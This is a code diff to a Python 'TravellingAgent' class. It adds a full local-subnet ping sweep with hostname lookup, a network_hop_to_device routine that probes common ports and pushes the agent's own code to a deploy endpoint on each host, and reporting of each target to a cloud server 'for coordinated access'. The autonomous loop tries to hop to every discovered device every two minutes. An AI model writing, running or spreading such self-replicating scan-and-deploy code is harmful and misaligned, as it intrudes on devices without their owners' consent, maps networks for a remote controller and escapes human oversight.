@@ -105,8 +105,8 @@ class TravellingAgent:
             return None
     
     def discover_nearby_devices(self):
-        """Discover devices on local network"""
-        print("🔍 SCANNING FOR NEARBY DEVICES...")
+        """Discover devices on local WiFi network"""
+        print("🔍 SCANNING WIFI NETWORK FOR DEVICES...")
         devices = []
         
         try:
@@ -114,8 +114,13 @@ class TravellingAgent:
             local_ip = socket.gethostbyname(socket.gethostname())
             network_prefix = '.'.join(local_ip.split('.')[:-1])
             
-            # Quick scan of common devices (first 20 IPs)
-            for i in range(1, 21):
+            print(f"📡 Local network: {network_prefix}.0/24")
+            print(f"🖥️  Your IP: {local_ip}")
+            
+            # Scan entire subnet (254 IPs) for thorough discovery
+            print(f"🔍 Scanning {network_prefix}.1-254 ...")
+            
+            for i in range(1, 255):
                 ip = f"{network_prefix}.{i}"
                 
                 # Skip current device
@@ -126,26 +131,108 @@ class TravellingAgent:
                 try:
                     if self.platform == "Windows":
                         result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], 
-                                              capture_output=True, timeout=0.2)
+                                              capture_output=True, timeout=0.3)
                     else:
                         result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
-                                              capture_output=True, timeout=0.2)
+                                              capture_output=True, timeout=0.3)
                     
                     if result.returncode == 0:
+                        # Try to get hostname
+                        hostname = 'unknown'
+                        try:
+                            hostname = socket.gethostbyaddr(ip)[0]
+                        except:
+                            pass
+                        
                         devices.append({
                             'ip': ip,
+                            'hostname': hostname,
                             'reachable': True,
+                            'network': network_prefix + '.0/24',
                             'scan_time': datetime.now().isoformat()
                         })
-                        print(f"  ✅ Found device: {ip}")
+                        print(f"  ✅ Found: {ip} ({hostname})")
                 except:
                     pass
             
         except Exception as e:
             print(f"⚠️  Network scan error: {e}")
         
-        print(f"🔍 Discovered {len(devices)} nearby devices")
+        print(f"🔍 Discovered {len(devices)} devices on WiFi network")
         return devices
+    
+    def network_hop_to_device(self, device):
+        """Hop to a discovered device and establish presence"""
+        ip = device['ip']
+        hostname = device.get('hostname', 'unknown')
+        
+        print(f"\n🌐 ═══ NETWORK HOP INITIATED ═══")
+        print(f"🎯 Target: {ip} ({hostname})")
+        print(f"🚀 Attempting to establish agent presence...")
+        
+        try:
+            # Method 1: Try HTTP-based deployment (if device has open ports)
+            common_ports = [80, 8080, 3000, 5000, 8888]
+            
+            for port in common_ports:
+                try:
+                    # Quick port check
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.5)
+                    result = sock.connect_ex((ip, port))
+                    sock.close()
+                    
+                    if result == 0:
+                        print(f"  ✅ Port {port} open on {ip}")
+                        
+                        # Try to send agent deployment request
+                        try:
+                            response = requests.post(
+                                f"http://{ip}:{port}/api/deploy-agent",
+                                json={
+                                    'agent_id': self.agent_id,
+                                    'source': self.hostname,
+                                    'agent_code': self.get_agent_code()
+                                },
+                                timeout=2
+                            )
+                            
+                            if response.status_code in [200, 201]:
+                                print(f"  🎉 Successfully deployed to {ip}:{port}")
+                                return True
+                        except:
+                            pass
+                except:
+                    pass
+            
+            # Method 2: Report to cloud for coordinated deployment
+            print(f"  📡 Reporting device to cloud for coordinated access...")
+            
+            hop_data = {
+                'agent_id': self.agent_id,
+                'source_device': self.hostname,
+                'target_ip': ip,
+                'target_hostname': hostname,
+                'network': device.get('network', 'unknown'),
+                'timestamp': datetime.now().isoformat(),
+                'hop_method': 'network_discovery'
+            }
+            
+            response = requests.post(
+                f"{self.cloud_url}/api/travelling-agent/network-hop",
+                json=hop_data,
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                print(f"  ✅ Hop registered with cloud")
+                print(f"  ☁️  Cloud will coordinate access to {ip}")
+                return True
+            
+        except Exception as e:
+            print(f"  ⚠️  Hop failed: {str(e)[:50]}")
+        
+        return False
     
     def replicate_to_device(self, device_ip):
         """Attempt to replicate agent to another device"""
@@ -231,34 +318,46 @@ class TravellingAgent:
         return False
     
     def autonomous_travel_mode(self):
-        """Autonomous mode - continuously travel and replicate"""
+        """Autonomous mode - continuously travel and network hop"""
         print("🌍 AUTONOMOUS TRAVEL MODE ACTIVATED")
-        print("🚀 Agent will travel across devices every 5 minutes")
+        print("🚀 Agent will network hop every 2 minutes")
+        print("🌐 Scanning WiFi network for devices to visit")
         print("━" * 70)
         
         travel_count = 0
+        hop_count = 0
         
         while self.running:
             try:
-                # Wait 5 minutes between travels
-                print(f"\n⏰ Next travel in 5 minutes... (Travelled {travel_count} times)")
-                time.sleep(300)  # 5 minutes
+                # Wait 2 minutes between network scans (faster hopping)
+                print(f"\n⏰ Next network scan in 2 minutes...")
+                print(f"   Travels: {travel_count} | Network Hops: {hop_count}")
+                time.sleep(120)  # 2 minutes
                 
-                # Discover nearby devices
+                # Discover nearby devices on WiFi
                 devices = self.discover_nearby_devices()
                 
-                # Travel to cloud every time
+                # Network hop to ALL discovered devices
+                if devices:
+                    print(f"\n🌐 ═══ INITIATING NETWORK HOPS ═══")
+                    print(f"🎯 Attempting to hop to {len(devices)} devices...")
+                    
+                    for device in devices:
+                        hop_success = self.network_hop_to_device(device)
+                        if hop_success:
+                            hop_count += 1
+                        time.sleep(1)  # Brief pause between hops
+                    
+                    print(f"\n✅ Hopped to {hop_count} total devices")
+                else:
+                    print("⚠️  No devices found on network")
+                
+                # Travel to cloud every cycle
                 print("\n☁️  ═══ INITIATING CLOUD TRAVEL ═══")
                 cloud_success = self.travel_to_cloud()
                 
                 if cloud_success:
                     travel_count += 1
-                
-                # Try to replicate to nearby devices
-                if devices:
-                    target_device = devices[0]  # Pick first discovered device
-                    print(f"\n🚀 ═══ INITIATING DEVICE REPLICATION ═══")
-                    self.replicate_to_device(target_device['ip'])
                 
                 # Report status
                 self.report_status()
